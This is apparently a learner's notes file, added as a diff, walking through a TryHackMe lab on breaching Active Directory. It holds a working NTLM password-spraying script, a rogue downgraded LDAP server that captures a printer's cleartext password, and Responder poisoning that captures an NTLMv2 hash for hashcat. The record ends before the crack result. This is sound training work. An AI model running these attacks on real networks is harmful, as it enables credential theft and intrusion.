@@ -1,0 +1,894 @@
+BREACHING ACTIVE DIRECTORY.
+
+
+
+[>>> TASK 1: INTRODUCTION TO AD BREACHES]
+[NOTE]
+This room requires downloading a specific .ovpn file.
+[ACTION: CONNECT TO NETWORK]
+sudo openvpn suto-breachingad.ovpn 
+
+
+[NOTE]
+We now need to configure dns.
+[ACTION: get wifi/ethernet (whatever is used) name]
+nmcli connection show --active
+
+
+[ACTION: set custom dns server]
+nmcli connection modify "WIFI_NAME" ipv4.dns "10.200.80.101 1.1.1.1"
+nmcli connection modify "WIFI_NAME" ipv4.ignore-auto-dns yes
+nmcli connection down "WIFI_NAME"
+nmcli connection up "WIFI_NAME"
+
+
+[ACTION: verify proper setup]
+nmcli device show | grep IP4.DNS
+[OUTPUT]
+IP4.DNS[1]:                             10.200.80.101
+IP4.DNS[2]:                             1.1.1.1
+
+
+[ACTION: verify network is active]
+ping 10.200.80.101
+[OUTPUT]
+PING 10.200.80.101 (10.200.80.101) 56(84) bytes of data.
+64 bytes from 10.200.80.101: icmp_seq=1 ttl=127 time=45.5 ms
+64 bytes from 10.200.80.101: icmp_seq=2 ttl=127 time=47.6 ms
+^C
+
+
+[ACTION: verify dns server within network is active]
+nslookup za.tryhackme.com 10.200.80.101
+[OUTPUT]
+Server:		10.200.80.101
+Address:	10.200.80.101#53
+
+Name:	za.tryhackme.com
+Address: 10.200.80.101
+
+
+
+[1.1. I HAVE COMPLETED THE AD BASICS ROOM AND AM READY TO LEARN ABOUT AD BREACHING TECHNIQUES]
+Nothing to answer here.
+
+
+
+[1.2. I HAVE CONNECTED TO THE NETWORK AND CONFIGURED DNS]
+Nothing to answer here.
+
+
+
+
+[>>> TASK 2: OSINT AND PHISING]
+[2.1. I UNDERSTAND OSINT AND HOW IT CAN BE USED TO BREACH AD]
+Nothing to answer here.
+
+
+
+[2.2. I UNDERSTAND PHISING AND HOW IT CAN BE USED TO BREACH AD]
+Nothing to answer here.
+
+
+
+[2.3. WHAT POPULAR WEBSITE CAN BE USED TO VERIFY IF YOUR EMAIL ADDRESS OR PASSWORD HAS EVER BEEN EXPOSED IN A PUBLICLY DISCLOSED DATA BREACH?]
+[ANSWER]
+haveibeenpwned
+
+
+
+
+[>>> TASK 3: NTLM AUTHENTICATION SERVICES]
+[INFO: NTLM]
+NTLM (New Technology LAN Manager) is the suite of security protocols used to authenticate user's identities in AD.
+To authenticate, NTLM uses a challenge-response-based scheme called NetNTLM.
+Services that use NetNTLM and can be exposed to internet:
+1. Internally hosted mail that expose an OWA (Outlook Web App) login portal.
+2. RDP.
+3. Exposed VPN endpoints integrated with AD.
+4. Webapps facing the internet that use NetNTLM.
+
+NetNTLM = windows authentication = NTLM authentication.
+NetNTLM allows application to be middle man beween client and AD.
+Authentication material is forwarded to a DC as a challenge.
+If challenge comleted successfully, app authenticates user.
+
+App authenticates on behalf user.
+User isn't authenticated directly on app.
+This prevents app from storing AD creds (which are only stored in DC).
+
+
+[INFO: bruteforce NetNTLM]
+Account lockout is probably configured. 
+Can't do full brute-force attack. Instead, password spray (all usernames test one password).
+
+
+[NOTE]
+We have been provided username list.
+Default password is Changeme123.
+[ACTION: visit http://ntlmauth.za.tryhackme.com]
+We face a login portal asking for username and password.
+
+
+[ACTION: display script provided in task files]
+unzip passwordsprayer-1647011410194.zip
+cat ntlm_passwordspray.py
+[OUTPUT]
+#!/usr/bin/python3
+
+import requests
+from requests_ntlm import HttpNtlmAuth
+import sys, getopt
+
+class NTLMSprayer:
+    def __init__(self, fqdn):
+        self.HTTP_AUTH_FAILED_CODE = 401
+        self.HTTP_AUTH_SUCCEED_CODE = 200
+        self.verbose = True
+        self.fqdn = fqdn
+
+    def load_users(self, userfile):
+        self.users = []
+        lines = open(userfile, 'r').readlines()
+        for line in lines:
+            self.users.append(line.replace("\r", "").replace("\n", ""))
+
+    def password_spray(self, password, url):
+        print ("[*] Starting passwords spray attack using the following password: " + password)
+        count = 0
+        for user in self.users:
+            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
+            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
+                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+                count += 1
+                continue
+            if (self.verbose):
+                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
+                    print ("[-] Failed login with Username: " + user)
+        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
+
+def main(argv):
+    userfile = ''
+    fqdn = ''
+    password = ''
+    attackurl = ''
+
+    try:
+        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
+    except getopt.GetoptError:
+        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        sys.exit(2)
+
+    for opt, arg in opts:
+        if opt == '-h':
+            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+            sys.exit()
+        elif opt in ("-u", "--userfile"):
+            userfile = str(arg)
+        elif opt in ("-f", "--fqdn"):
+            fqdn = str(arg)
+        elif opt in ("-p", "--password"):
+            password = str(arg)
+        elif opt in ("-a", "--attackurl"):
+            attackurl = str(arg)
+
+    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
+        #Start attack
+        sprayer = NTLMSprayer(fqdn)
+        sprayer.load_users(userfile)
+        sprayer.password_spray(password, attackurl)
+        sys.exit()
+    else:
+        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
+        sys.exit(2)
+
+
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
+[NOTE]
+Script syntax:
+python ntlm_passwordspray.py -u <user_file> -f <fqdn> -q <password> -a <attackurl>
+Explanation:
+fqdn = fully qualified domain name
+
+
+[ACTION: trigger spray attack]
+python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
+[NOTE]
+Had an error, line 4. Fix:
+sudo apt install python3-requests-ntlm
+[OUTPUT]
+python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com
+[*] Starting passwords spray attack using the following password: Changeme123
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+[-] Failed login with Username: anthony.reynolds
+[-] Failed login with Username: samantha.thompson
+[-] Failed login with Username: dawn.turner
+[-] Failed login with Username: frances.chapman
+[-] Failed login with Username: henry.taylor
+[-] Failed login with Username: jennifer.wood
+[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
+[-] Failed login with Username: louise.talbot
+[+] Valid credential pair found! Username: heather.smith Password: Changeme123
+[-] Failed login with Username: dominic.elliott
+[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
+[-] Failed login with Username: alan.jones
+[-] Failed login with Username: frank.fletcher
+[-] Failed login with Username: maria.sheppard
+[-] Failed login with Username: sophie.blackburn
+[-] Failed login with Username: dawn.hughes
+[-] Failed login with Username: henry.black
+[-] Failed login with Username: joanne.davies
+[-] Failed login with Username: mark.oconnor
+[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
+[*] Password spray attack completed, 4 valid credential pairs found
+[Note]
+We found:
+1. hollie.powell
+2. heather.smith
+3. gordon.stevens
+4. georgina.edwards
+
+
+
+[3.1. WHAT IS THE NAME OF THE CHALLENGE-RESPONSE AUTHENTICATION MECHANISM THAT USES NTLM?]
+netntlm
+
+
+
+[3.2. WHAT IS THE USERNAME OF THE THIRD VALID CREDENTIAL PAIR FOUND BY THE PASSWORD SPRAYING SCRIPT?]
+[ANSWER]
+gordon.stevens
+
+
+
+[3.3. HOW MANY VALID CREDENTIALS PAIRS WERE FOUND BY THE PASSWORD SPRAYING SCRIPT?]
+[ANSWER]
+4
+
+
+
+[3.4. WHAT IS THE MESSAGE DISPLAYED BY THE WEB APPLICATION WHEN AUTHENTICATING WITH A VALID CREDENTIAL PAIR?]
+[ACTION: log in as gordon.stevens in http://ntlmauth.za.tryhackme.com/]
+[OUTPUT]
+Hello World
+[ANSWER]
+Hello World
+
+
+
+
+[>>> TASK 4: LDAP BIND CREDENTIALS]
+[INFO: LDAP]
+LDAP (Lightweight Directory Access Protocol) is another AD authentication method used by apps.
+In LDAP, app directly verifies the user's creds.
+App has a pair of AD credentials, used to:
+1. Query LDAP.
+2. Verify AD user's creds.
+
+LDAP popular with third-party apps that integrate with AD, such as gitlab, jenkins, printers, vpns, etc.
+If these services/apps exposed to internet, we can leverage same attacks as against NTLM. 
+Since LDAP auth requires a set of AD creds, it also opens up additional attack avenues.
+
+We can try recover the AD creds used by the service to gain authenticated access to AD.
+
+
+[INFO: LDAP PASS-BACK ATTACKS]
+Common attack against network devices (like printers), performed after gaining initial access to internal network.
+LDAP pass-back attacks can be performed when we gain access to a device's config where LDAP parameters are specified. Examples: web interface or network printer.
+Directly extracting LDAP creds is unlikely, since passwords are usually hidden.
+However, we can alter LDAP config (IP, hostname) of LDAP server-
+This way we force device to attempt LDAP auth to our device.
+
+
+[ACTION: explore http://printer.za.tryhackme.com/settings.aspx]
+[OUTPUT]
+Printer Settings
+LDAP Settings
+Username:    
+svcLDAP
+
+Password:    
+*************
+
+Server:         
+10.10.10.101
+[NOTE]
+Found username svcLDAP.
+
+
+[ACTION: analyze source code]
+[OUTPUT]
+<input name="txtPassword" type="text" value="*************" id="txtPassword">
+[NOTE]
+LDAP password isn't directly sent back to browser.
+
+
+[NOTE]
+Default port for LDAP is 389.
+Pressing Test Settings sends auth request to the DC.
+[ACTION: start listener on ldap port]
+nc -lvp 389
+
+
+[NOTE]
+We can try use our ip on server field to catch the request.
+[ACTION: get vpn ip (breachad)]
+ip a
+[OUTPUT]
+10.50.79.18
+
+
+[ACTION: change server and test]
+[OUTPUT]
+10.200.80.201: inverse host lookup failed: Unknown host
+connect to [10.50.79.18] from (UNKNOWN) [10.200.80.201] 54891
+0�Dc�;
+
+x�
+  objectclass0�supportedCapabilities
+[NOTE]
+Before LDAP creds are sent, printer negotiates most seucre method for both printer and LDAp server.
+If secure enough, creds won't be displayed in clear text (our case).
+We need to fake an insecure LDAP server.
+
+
+[ACTION: install openldap]
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+
+
+[ACTION: configure server]
+sudo dpkg-reconfigure -p low slapd
+No
+za.tryhackme.com
+za.tryhackme.com
+
+
+[ACTION: create olcSaslSecProps.ldif, content]
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+
+
+[ACTION: apply settings to server]
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+
+
+[ACTION: click test settings]
+[OUTPUT]
+LDAP Connection failed: The distinguished name contains invalid syntax.
+
+
+[ACTION: display creds (need to test again)]
+sudo tcpdump -SX -i breachad tcp port 389
+[OUTPUT]
+listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
+17:40:49.963557 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [SEW], seq 3882846068, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
+	0x0000:  4502 0034 9233 4000 7f06 b4b9 0ac8 50c9  E..4.3@.......P.
+	0x0010:  0a32 4f12 d144 0185 e76f 8774 0000 0000  .2O..D...o.t....
+	0x0020:  80c2 faf0 7d87 0000 0204 0509 0103 0308  ....}...........
+	0x0030:  0101 0402                                ....
+17:40:49.963671 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [S.], seq 272376984, ack 3882846069, win 32120, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+	0x0000:  4500 0034 0000 4000 4006 85ef 0a32 4f12  E..4..@.@....2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 2498 e76f 8775  ..P....D.<$..o.u
+	0x0020:  8012 7d78 c630 0000 0204 05b4 0101 0402  ..}x.0..........
+	0x0030:  0103 0307                                ....
+17:40:50.011300 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [.], ack 272376985, win 1027, length 0
+	0x0000:  4500 0028 9234 4000 7f06 b4c6 0ac8 50c9  E..(.4@.......P.
+	0x0010:  0a32 4f12 d144 0185 e76f 8775 103c 2499  .2O..D...o.u.<$.
+	0x0020:  5010 0403 8078 0000                      P....x..
+17:40:50.011606 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [P.], seq 3882846069:3882846143, ack 272376985, win 1027, length 74
+	0x0000:  4500 0072 9235 4000 7f06 b47b 0ac8 50c9  E..r.5@....{..P.
+	0x0010:  0a32 4f12 d144 0185 e76f 8775 103c 2499  .2O..D...o.u.<$.
+	0x0020:  5018 0403 26eb 0000 3084 0000 0044 0201  P...&...0....D..
+	0x0030:  1963 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
+	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
+	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
+	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
+	0x0070:  6573                                     es
+17:40:50.011644 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [.], ack 3882846143, win 251, length 0
+	0x0000:  4500 0028 ffbb 4000 4006 863f 0a32 4f12  E..(..@.@..?.2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 2499 e76f 87bf  ..P....D.<$..o..
+	0x0020:  5010 00fb 8336 0000                      P....6..
+17:40:50.012279 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272376985:272376996, ack 3882846143, win 251, length 11
+	0x0000:  4500 0033 ffbc 4000 4006 8633 0a32 4f12  E..3..@.@..3.2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 2499 e76f 87bf  ..P....D.<$..o..
+	0x0020:  5018 00fb 3381 0000 3009 0201 1964 0404  P...3...0....d..
+	0x0030:  0030 00                                  .0.
+17:40:50.012334 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272376996:272377010, ack 3882846143, win 251, length 14
+	0x0000:  4500 0036 ffbd 4000 4006 862f 0a32 4f12  E..6..@.@../.2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 24a4 e76f 87bf  ..P....D.<$..o..
+	0x0020:  5018 00fb 2799 0000 300c 0201 1965 070a  P...'...0....e..
+	0x0030:  0100 0400 0400                           ......
+17:40:50.060604 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [.], ack 272377010, win 1027, length 0
+	0x0000:  4500 0028 9236 4000 7f06 b4c4 0ac8 50c9  E..(.6@.......P.
+	0x0010:  0a32 4f12 d144 0185 e76f 87bf 103c 24b2  .2O..D...o...<$.
+	0x0020:  5010 0403 8015 0000                      P.......
+17:40:50.060827 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [P.], seq 3882846143:3882846219, ack 272377010, win 1027, length 76
+	0x0000:  4500 0074 9237 4000 7f06 b477 0ac8 50c9  E..t.7@....w..P.
+	0x0010:  0a32 4f12 d144 0185 e76f 87bf 103c 24b2  .2O..D...o...<$.
+	0x0020:  5018 0403 ec45 0000 3084 0000 0046 0201  P....E..0....F..
+	0x0030:  1a63 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
+	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
+	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
+	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
+	0x0070:  6973 6d73                                isms
+17:40:50.061314 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272377010:272377064, ack 3882846219, win 251, length 54
+	0x0000:  4500 005e ffbe 4000 4006 8606 0a32 4f12  E..^..@.@....2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 24b2 e76f 880b  ..P....D.<$..o..
+	0x0020:  5018 00fb 9c25 0000 3034 0201 1a64 2f04  P....%..04...d/.
+	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
+	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
+	0x0050:  0405 4c4f 4749 4e04 0550 4c41 494e       ..LOGIN..PLAIN
+17:40:50.061381 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272377064:272377078, ack 3882846219, win 251, length 14
+	0x0000:  4500 0036 ffbf 4000 4006 862d 0a32 4f12  E..6..@.@..-.2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 24e8 e76f 880b  ..P....D.<$..o..
+	0x0020:  5018 00fb 2609 0000 300c 0201 1a65 070a  P...&...0....e..
+	0x0030:  0100 0400 0400                           ......
+17:40:50.109726 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [.], ack 272377078, win 1026, length 0
+	0x0000:  4500 0028 9238 4000 7f06 b4c2 0ac8 50c9  E..(.8@.......P.
+	0x0010:  0a32 4f12 d144 0185 e76f 880b 103c 24f6  .2O..D...o...<$.
+	0x0020:  5010 0402 7f86 0000                      P.......
+17:40:50.117392 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [P.], seq 3882846219:3882846293, ack 272377078, win 1026, length 74
+	0x0000:  4500 0072 9239 4000 7f06 b477 0ac8 50c9  E..r.9@....w..P.
+	0x0010:  0a32 4f12 d144 0185 e76f 880b 103c 24f6  .2O..D...o...<$.
+	0x0020:  5018 0402 23f9 0000 3084 0000 0044 0201  P...#...0....D..
+	0x0030:  1b63 8400 0000 3b04 000a 0100 0a01 0002  .c....;.........
+	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
+	0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
+	0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
+	0x0070:  6573                                     es
+17:40:50.118054 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272377078:272377089, ack 3882846293, win 251, length 11
+	0x0000:  4500 0033 ffc0 4000 4006 862f 0a32 4f12  E..3..@.@../.2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 24f6 e76f 8855  ..P....D.<$..o.U
+	0x0020:  5018 00fb 308e 0000 3009 0201 1b64 0404  P...0...0....d..
+	0x0030:  0030 00                                  .0.
+17:40:50.118116 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272377089:272377103, ack 3882846293, win 251, length 14
+	0x0000:  4500 0036 ffc1 4000 4006 862b 0a32 4f12  E..6..@.@..+.2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 2501 e76f 8855  ..P....D.<%..o.U
+	0x0020:  5018 00fb 24a6 0000 300c 0201 1b65 070a  P...$...0....e..
+	0x0030:  0100 0400 0400                           ......
+17:40:50.166041 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [.], ack 272377103, win 1026, length 0
+	0x0000:  4500 0028 923a 4000 7f06 b4c0 0ac8 50c9  E..(.:@.......P.
+	0x0010:  0a32 4f12 d144 0185 e76f 8855 103c 250f  .2O..D...o.U.<%.
+	0x0020:  5010 0402 7f23 0000                      P....#..
+17:40:50.166261 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [P.], seq 3882846293:3882846359, ack 272377103, win 1026, length 66
+	0x0000:  4500 006a 923b 4000 7f06 b47d 0ac8 50c9  E..j.;@....}..P.
+	0x0010:  0a32 4f12 d144 0185 e76f 8855 103c 250f  .2O..D...o.U.<%.
+	0x0020:  5018 0402 9276 0000 3084 0000 003c 0201  P....v..0....<..
+	0x0030:  1c60 8400 0000 3302 0103 0404 4e54 4c4d  .`....3.....NTLM
+	0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
+	0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
+	0x0060:  0000 0a00 6345 0000 000f                 ....cE....
+17:40:50.166612 IP 10.50.79.18.ldap > 10.200.80.201.53572: Flags [P.], seq 272377103:272377127, ack 3882846359, win 251, length 24
+	0x0000:  4500 0040 ffc2 4000 4006 8620 0a32 4f12  E..@..@.@....2O.
+	0x0010:  0ac8 50c9 0185 d144 103c 250f e76f 8897  ..P....D.<%..o..
+	0x0020:  5018 00fb 2472 0000 3016 0201 1c61 110a  P...$r..0....a..
+	0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
+17:40:50.214868 IP 10.200.80.201.53573 > 10.50.79.18.ldap: Flags [SEW], seq 91739882, win 64240, options [mss 1289,nop,wscale 8,nop,nop,sackOK], length 0
+	0x0000:  4502 0034 923c 4000 7f06 b4b0 0ac8 50c9  E..4.<@.......P.
+	0x0010:  0a32 4f12 d145 0185 0577 d6ea 0000 0000  .2O..E...w......
+	0x0020:  80c2 faf0 1009 0000 0204 0509 0103 0308  ................
+	0x0030:  0101 0402                                ....
+17:40:50.214957 IP 10.50.79.18.ldap > 10.200.80.201.53573: Flags [S.], seq 651705556, ack 91739883, win 32120, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
+	0x0000:  4500 0034 0000 4000 4006 85ef 0a32 4f12  E..4..@.@....2O.
+	0x0010:  0ac8 50c9 0185 d145 26d8 3cd4 0577 d6eb  ..P....E&.<..w..
+	0x0020:  8012 7d78 29da 0000 0204 05b4 0101 0402  ..}x)...........
+	0x0030:  0103 0307                                ....
+17:40:50.256756 IP 10.200.80.201.53572 > 10.50.79.18.ldap: Flags [.], ack 272377127, win 1026, length 0
+	0x0000:  4500 0028 923d 4000 7f06 b4bd 0ac8 50c9  E..(.=@.......P.
+	0x0010:  0a32 4f12 d144 0185 e76f 8897 103c 2527  .2O..D...o...<%'
+	0x0020:  5010 0402 7ec9 0000                      P...~...
+17:40:50.262328 IP 10.200.80.201.53573 > 10.50.79.18.ldap: Flags [.], ack 651705557, win 1027, length 0
+	0x0000:  4500 0028 923e 4000 7f06 b4bc 0ac8 50c9  E..(.>@.......P.
+	0x0010:  0a32 4f12 d145 0185 0577 d6eb 26d8 3cd5  .2O..E...w..&.<.
+	0x0020:  5010 0403 e421 0000                      P....!..
+17:40:50.262456 IP 10.200.80.201.53573 > 10.50.79.18.ldap: Flags [P.], seq 91739883:91739948, ack 651705557, win 1027, length 65
+	0x0000:  4500 0069 923f 4000 7f06 b47a 0ac8 50c9  E..i.?@....z..P.
+	0x0010:  0a32 4f12 d145 0185 0577 d6eb 26d8 3cd5  .2O..E...w..&.<.
+	0x0020:  5018 0403 fc3b 0000 3084 0000 003b 0201  P....;..0....;..
+	0x0030:  1d60 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
+	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
+	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
+	0x0060:  6461 7070 6173 7331 40                   dappass1@
+17:40:50.262491 IP 10.50.79.18.ldap > 10.200.80.201.53573: Flags [.], ack 91739948, win 251, length 0
+	0x0000:  4500 0028 029f 4000 4006 835c 0a32 4f12  E..(..@.@..\.2O.
+	0x0010:  0ac8 50c9 0185 d145 26d8 3cd5 0577 d72c  ..P....E&.<..w.,
+	0x0020:  5010 00fb e6e8 0000                      P.......
+17:40:50.263461 IP 10.50.79.18.ldap > 10.200.80.201.53573: Flags [P.], seq 651705557:651705581, ack 91739948, win 251, length 24
+	0x0000:  4500 0040 02a0 4000 4006 8343 0a32 4f12  E..@..@.@..C.2O.
+	0x0010:  0ac8 50c9 0185 d145 26d8 3cd5 0577 d72c  ..P....E&.<..w.,
+	0x0020:  5018 00fb 8872 0000 3016 0201 1d61 110a  P....r..0....a..
+	0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
+17:40:50.366477 IP 10.200.80.201.53573 > 10.50.79.18.ldap: Flags [.], ack 651705581, win 1027, length 0
+	0x0000:  4500 0028 9242 4000 7f06 b4b8 0ac8 50c9  E..(.B@.......P.
+	0x0010:  0a32 4f12 d145 0185 0577 d72c 26d8 3ced  .2O..E...w.,&.<.
+	0x0020:  5010 0403 e3c8 0000                      P.......
+[NOTE]
+Can find password quickly reading output down-up: tryhackmeldappass1@
+
+
+
+[4.1. WHAT TYPE OF ATTACK CAN BE PERFORMED AGAINST LDAP AUTHENTICATION SYSTEMS NOT COMMONLY FOUND AGAINST WINDOWS AUTHENTICATION SYSTEMS?]
+[ANSWER]
+ldap pass-back attack
+
+
+
+[4.2. WHAT TWO AUTHENTICATION MECHANISMS DO WE ALLOW ON OUR ROGUE LDAP SERVER TO DOWNGRADE THE AUTHENTICATION AND MAKE IT CLEAR TEXT?]
+[ANSWER]
+login,plain
+
+
+
+
+[>>> TASK 5: AUTHENTICATION RELAYS]
+[INFO: SMB]
+SMB (Server Message Block) protocol allows clients (like workstations) to communicate with a server (like a file share).
+In networks that use Microsoft AD, SMB governs everything.
+Earlier versions of SMB are insecure.
+
+Exploits for NetNTLM auth with SMB:
+1. Intercepting the NTLM challenge and crack the password offline.
+2. Perform MITM attack via rogue device: relaying SMB auth between client and server provides middle man with active authenticated session and access to target server.
+
+
+[INFO: RESPONDER MITM ATTACK]
+Responder poisions responses during NetNTLM auth, tricking client into talking to attacker instead of server.
+Responder will attempt to poison:
+1. LLMNR (Link-Local Multicast Name Resolution).
+2. NBT-NS (NetBIOS Name Service).
+3. WPAD (Web Proxy Auto-Discovery) detected requests.
+
+
+[ACTION: run responder]
+sudo responder -I breachad
+[NOTE]
+If slapd is still running from prev tasks (responder will show error about port 389), stop it: sudo systemctl stop slapd
+[OUTPUT]
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.6.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [breachad]
+    Responder IP               [10.50.79.18]
+    Responder IPv6             [fe80::a110:a31b:86a2:d015]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+    Don't Respond To MDNS TLD  ['_DOSVC']
+    TTL for poisoned response  [default]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-VAUVMRD0FYO]
+    Responder Domain Name      [1T4J.LOCAL]
+    Responder DCE-RPC Port     [47714]
+
+[+] Listening for events...
+[NOTE]
+We need to wait for the smbv2 session.
+[OUTPUT (new/session)]
+[SMB] NTLMv2-SSP Client   : 10.200.80.202
+[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
+[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:e466c1f9214313dd:D9EEDE5AFFE46E8A28D0BFB9E002AEFB:01010000000000000028B2736A05DC0170D7677237D5A54D00000000020008003100540034004A0001001E00570049004E002D0056004100550056004D00520044003000460059004F0004003400570049004E002D0056004100550056004D00520044003000460059004F002E003100540034004A002E004C004F00430041004C00030014003100540034004A002E004C004F00430041004C00050014003100540034004A002E004C004F00430041004C00070008000028B2736A05DC0106000400020000000800300030000000000000000000000000200000602BF2025763865048132FD65C35BA59373EC22388262020916AE7091C5624160A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00370039002E00310038000000000000000000
+
+
+[ACTION: make hash file]
+echo 'svcFileCopy::ZA:e466c1f9214313dd:D9EEDE5AFFE46E8A28D0BFB9E002AEFB:01010000000000000028B2736A05DC0170D7677237D5A54D00000000020008003100540034004A0001001E00570049004E002D0056004100550056004D00520044003000460059004F0004003400570049004E002D0056004100550056004D00520044003000460059004F002E003100540034004A002E004C004F00430041004C00030014003100540034004A002E004C004F00430041004C00050014003100540034004A002E004C004F00430041004C00070008000028B2736A05DC0106000400020000000800300030000000000000000000000000200000602BF2025763865048132FD65C35BA59373EC22388262020916AE7091C5624160A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00370039002E00310038000000000000000000' > ntlm_hash.txt
+
+
+[ACTION: crack via hashcat]
+hashcat -m 5600 ntlm_hash.txt passwordlist-1647876320267.txt --force
+
+
+[ACTION: display password found]
+hashcat -m 5600 ntlm_hash.txt --show
+[OUTPUT]
